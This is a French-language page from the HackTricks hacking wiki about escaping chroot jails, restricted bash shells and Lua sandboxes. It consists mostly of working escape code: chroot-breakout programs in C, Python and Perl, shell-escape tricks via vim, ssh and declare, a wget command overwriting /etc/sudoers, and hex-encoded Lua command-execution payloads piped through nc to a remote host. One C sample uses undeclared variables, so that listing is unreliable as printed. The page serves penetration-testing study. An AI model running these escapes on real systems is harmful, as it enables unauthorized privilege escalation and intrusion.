# S'échapper des Jails

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **GTFOBins**

**Recherchez dans** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **si vous pouvez exécuter un binaire avec la propriété "Shell"**

## Évasions de Chroot

D'après [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) : Le mécanisme chroot n'est **pas destiné à se défendre** contre les manipulations intentionnelles par des utilisateurs **privilégiés** (**root**). Sur la plupart des systèmes, les contextes chroot ne se superposent pas correctement et les programmes chrootés **avec des privilèges suffisants peuvent effectuer un second chroot pour s'échapper**.\
En général, cela signifie qu'il faut être root à l'intérieur du chroot pour s'échapper.

{% hint style="success" %}
L'**outil** [**chw00t**](https://github.com/earthquake/chw00t) a été créé pour abuser des scénarios suivants et s'échapper de `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Si vous êtes **root** à l'intérieur d'un chroot, vous **pouvez vous échapper** en créant **un autre chroot**. Cela est possible car 2 chroots ne peuvent pas coexister (sous Linux), donc si vous créez un dossier et ensuite **créez un nouveau chroot** sur ce nouveau dossier en étant **à l'extérieur de celui-ci**, vous serez maintenant **à l'extérieur du nouveau chroot** et donc vous serez dans le FS.

Cela se produit généralement car le chroot NE déplace PAS votre répertoire de travail vers celui indiqué, vous pouvez donc créer un chroot mais être à l'extérieur de celui-ci.
{% endhint %}

Généralement, vous ne trouverez pas le binaire `chroot` à l'intérieur d'une prison chroot, mais vous **pourriez le compiler, le télécharger et l'exécuter** :

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
### Racine + Descripteur de fichier enregistré

{% hint style="warning" %}
Ceci est similaire au cas précédent, mais dans ce cas, l'**attaquant stocke un descripteur de fichier vers le répertoire actuel** puis **crée le chroot dans un nouveau dossier**. Enfin, comme il a **accès** à ce **FD** **en dehors** du chroot, il y accède et il **s'échappe**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Racine + Fork + UDS (Sockets de domaine Unix)

{% hint style="warning" %}
FD peut être transmis via des sockets de domaine Unix, donc :

* Créer un processus enfant (fork)
* Créer des UDS pour que le parent et l'enfant puissent communiquer
* Exécuter chroot dans le processus enfant dans un dossier différent
* Dans le processus parent, créer un FD d'un dossier qui se trouve en dehors du nouveau chroot du processus enfant
* Transmettre à l'enfant ce FD en utilisant les UDS
* Le processus enfant se déplace vers ce FD, et parce qu'il est en dehors de son chroot, il s'échappera de la prison
{% endhint %}

### Racine + Montage

{% hint style="warning" %}
* Monter le périphérique racine (/) dans un répertoire à l'intérieur du chroot
* Chrooter dans ce répertoire

C'est possible sous Linux
{% endhint %}

### Racine + /proc

{% hint style="warning" %}
* Monter procfs dans un répertoire à l'intérieur du chroot (si ce n'est pas déjà fait)
* Rechercher un pid qui a une entrée root/cwd différente, comme : /proc/1/root
* Chrooter dans cette entrée
{% endhint %}

### Racine(?) + Fork

{% hint style="warning" %}
* Créer un Fork (processus enfant) et chrooter dans un dossier différent plus profondément dans le système de fichiers et CD dessus
* Depuis le processus parent, déplacer le dossier où se trouve le processus enfant dans un dossier précédent au chroot des enfants
* Ce processus enfant se retrouvera en dehors du chroot
{% endhint %}

### ptrace

{% hint style="warning" %}
* Il y a quelque temps, les utilisateurs pouvaient déboguer leurs propres processus à partir d'un processus de lui-même... mais cela n'est plus possible par défaut
* Quoi qu'il en soit, s'il est possible, vous pourriez ptracer un processus et exécuter un shellcode à l'intérieur ([voir cet exemple](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Jails Bash

### Énumération

Obtenir des informations sur la prison :
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Modifier PATH

Vérifiez si vous pouvez modifier la variable d'environnement PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Utilisation de vim
```bash
:set shell=/bin/sh
:shell
```
### Créer un script

Vérifiez si vous pouvez créer un fichier exécutable avec _/bin/bash_ comme contenu
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Obtenir bash depuis SSH

Si vous accédez via ssh, vous pouvez utiliser ce tour de passe-passe pour exécuter un shell bash :
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Déclarer
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Vous pouvez écraser par exemple le fichier sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Autres astuces

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**Il pourrait également être intéressant de consulter la page :**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Jails Python

Astuces pour échapper aux prisons Python sur la page suivante :

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Jails Lua

Sur cette page, vous pouvez trouver les fonctions globales auxquelles vous avez accès à l'intérieur de Lua : [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Évaluation avec exécution de commandes :**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Quelques astuces pour **appeler des fonctions d'une bibliothèque sans utiliser de points** :
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Énumérer les fonctions d'une bibliothèque :
```bash
for k,v in pairs(string) do print(k,v) end
```
Notez que chaque fois que vous exécutez la commande précédente dans un **environnement lua différent, l'ordre des fonctions change**. Par conséquent, si vous devez exécuter une fonction spécifique, vous pouvez effectuer une attaque par force brute en chargeant différents environnements lua et en appelant la première fonction de la bibliothèque.
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Obtenir un shell lua interactif** : Si vous êtes dans un shell lua limité, vous pouvez obtenir un nouveau shell lua (et espérons-le illimité) en appelant :
```bash
debug.debug()
```
## Références

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Diapositives : [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>
